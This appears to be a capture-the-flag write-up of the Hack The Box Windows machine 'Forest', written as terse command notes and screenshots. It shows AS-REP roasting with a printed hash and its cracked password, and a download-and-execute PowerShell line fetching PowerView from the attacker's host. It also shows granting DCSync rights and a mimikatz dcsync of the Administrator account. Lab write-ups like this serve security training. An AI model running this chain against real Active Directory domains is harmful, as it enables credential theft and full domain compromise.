---
title: HTB-Forest
draft: false
tags:
  - htb
  - windows
  - easy
  - active-directory
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/Forest.png)

## Information Gathering
### Rustscan

`rustscan --addresses 10.10.10.161 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image.png)


## Enumeration
### RPC - TCP 135

rpcclient -U "" -N 10.10.10.161

enumdomusers


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-1.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-2.png)


### LDAP - TCP 389

`ldapsearch -H ldap://10.10.10.161 -x -s base namingcontexts`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-3.png)

`ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" > ldap-null-bing.txt`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-4.png)

`cat ldap-null-bing.txt | awk '{print $1}' | sort | uniq -c | sort -nr > xb-bind-sorted.txt`

## AS-REP Roasting

`GetNPUsers.py 'htb.local/' -user users.txt -format hashcat -outputfile hashes -dc-ip 10.10.10.161`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-5.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-6.png)

```bash
$krb5asrep$23$svc-alfresco@HTB.LOCAL:b2497b4761f7ce26a5b345a1560fc677$89a32db85e3185d3ac335ccf59a6ee074b8312756f9ff657214c12e48de9471781d46ff7ad10ab37024956cc171f75851d59be2d56eb62bd0e182ed04ccbb34603eb39124eff2c3c1d9603689f1707c1fd9f5699e76400d8edc484dded54f88b8d19b01e108bb54727cbdb3e608c5cd2aa5e0aeb371215f35dd0df22cef313fb7adc673443eacd5629ef413a2d761122e59802688ef28d99d3f8e38ea84e4822d7fb3170c6697df67c8868e06009b9c43a351f40ba96f4a7f28b99bd7b38b0d6ebd843dc8fc6d3e0fc87478fb9034f2c9dc97bd606289f1ac8493c8269f3e8e573e1d29a88d4
```

`haschat hash rockyou.txt`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/forest-hash.png)

s3rvice

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-8.png)


`evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-7.png)


## Privesc: svc-alfresco to 


upload SharpHound.exe

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-9.png)

./SharpHound.exe

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-10.png)

download 20240608002914_BloodHound.zip

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-11.png)


```bash
sudo neo4j console
sudo bloodhound
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-12.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-13.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-14.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-15.png)

`net group "Exchange Windows Permissions" svc-alfresco /add /domain`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-16.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-17.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-18.png)

upload PowerView.ps1

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-19.png)

. ./PowerView.ps1

(New-Object System.Net.WebClient).DownloadString('http://10.10.14.36:8000/PowerView.ps1') | IEX

net group "Exchange Windows Permissions" svc-alfresco /add /domain

$SecPass = ConvertTo-SecureString 's3rvice' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', $SecPass)

Add-ObjectACL -PrincipalIdentity svc-alfresco -Credential $Cred -Rights DCSync

```powershell
net group "Exchange Windows Permissions" svc-alfresco /add /domain; $Cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', (ConvertTo-SecureString 's3rvice' -AsPlainText -Force)); Add-ObjectACL -PrincipalIdentity svc-alfresco -Credential $Cred -Rights DCSync
```


lsadump::dcsync /domain:htb.local /user:Administrator

./mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:htb.local /user:Administrator" "exit"


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-20.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-21.png)